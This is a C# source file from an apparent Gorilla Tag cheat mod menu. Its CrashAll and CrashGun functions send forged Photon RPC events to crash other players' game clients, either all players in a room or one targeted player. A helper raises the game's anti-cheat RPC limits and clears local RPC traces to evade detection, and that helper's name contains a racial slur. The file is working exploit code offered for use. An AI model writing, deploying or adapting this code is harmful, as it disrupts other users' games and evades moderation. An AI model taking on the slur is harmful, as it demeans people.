using System;
using System.Collections.Generic;
using System.Text;
using static MenkerMenu.Utilities.GunTemplate;
using static MenkerMenu.Utilities.ColorLib;
using static MenkerMenu.Utilities.Variables;
using static MenkerMenu.Utilities.HandOrbs;
using static MenkerMenu.Menu.Main;
using static MenkerMenu.Utilities.RigManager;
using static MenkerMenu.Mods.Categories.Settings;
using UnityEngine;
using UnityEngine.InputSystem;
using MenkerMenu.Utilities;
using UnityEngine.XR;
using UnityEngine.Animations.Rigging;
using UnityEngine.XR.Interaction.Toolkit;
using GorillaNetworking;
using MenkerMenu.Utilities.Patches;
using MenkerMenu.Menu;
using ExitGames.Client.Photon;
using Photon.Pun;
using Photon.Realtime;
using HarmonyLib;
using BepInEx;
using MenkerMenu.Utilities;

namespace MenkerMenu.Mods.Categories
{
    public class Overpowered
    {

        public static void CrashAll()
        {
            foreach (VRRig rig in GorillaParent.instance.vrrigs)
            {
                if (rig && rig != GorillaTagger.Instance.offlineVRRig)
                {
                    PhotonView photonView = RigManager.GetPhotonViewFromVRRig(rig);
                    ExitGames.Client.Photon.Hashtable rpcHash = new ExitGames.Client.Photon.Hashtable
       {
           { 0, photonView.ViewID },
           { 2, (int)(PhotonNetwork.ServerTimestamp + -int.MaxValue) },
           { 3, "RPC_RequestMaterialColor" },
           { 4, new object[] { RigManager.NetPlayerToPlayer(RigManager.GetPlayerFromVRRig(rig)) } },
           { 5, (byte)91 }
      };
                    PhotonNetwork.NetworkingClient.LoadBalancingPeer.OpRaiseEvent(207, rpcHash, new RaiseEventOptions
                    {
                        Receivers = ReceiverGroup.Others,
                        InterestGroup = photonView.Group
                    }, new SendOptions
                    {
                        Reliability = true,
                        DeliveryMode = DeliveryMode.ReliableUnsequenced,
                        Encrypt = false
                    });
                }
                PhotonNetwork.SendAllOutgoingCommands();
                NoRpcniggers();
            }
        }
        public static void CrashGun()
        {
            GunTemplate.StartBothGuns(() =>
            {
                if (LockedPlayer && LockedPlayer != GorillaTagger.Instance.offlineVRRig)
                {
                    PhotonView photonView = RigManager.GetPhotonViewFromVRRig(LockedPlayer);
                    ExitGames.Client.Photon.Hashtable rpcHash = new ExitGames.Client.Photon.Hashtable
       {
           { 0, photonView.ViewID },
           { 2, (int)(PhotonNetwork.ServerTimestamp + -int.MaxValue) },
           { 3, "RPC_RequestMaterialColor" },
           { 4, new object[] { RigManager.NetPlayerToPlayer(RigManager.GetPlayerFromVRRig(LockedPlayer)) } },
           { 5, (byte)91 }
      };
                    PhotonNetwork.NetworkingClient.LoadBalancingPeer.OpRaiseEvent(207, rpcHash, new RaiseEventOptions
                    {
                        Receivers = ReceiverGroup.Others,
                        InterestGroup = photonView.Group
                    }, new SendOptions
                    {
                        Reliability = true,
                        DeliveryMode = DeliveryMode.ReliableUnsequenced,
                        Encrypt = false
                    });
                }
                PhotonNetwork.SendAllOutgoingCommands();
                NoRpcniggers();
            }, true);
        }
        public static void NoRpcniggers()
        {
            GorillaNot.instance.rpcCallLimit = int.MaxValue;
            GorillaNot.instance.rpcErrorMax = int.MaxValue;
            PhotonNetwork.RemoveRPCs(PhotonNetwork.LocalPlayer);
            PhotonNetwork.LocalCleanPhotonView(GorillaTagger.Instance.myVRRig.GetComponent<PhotonView>());
        }
    }
}
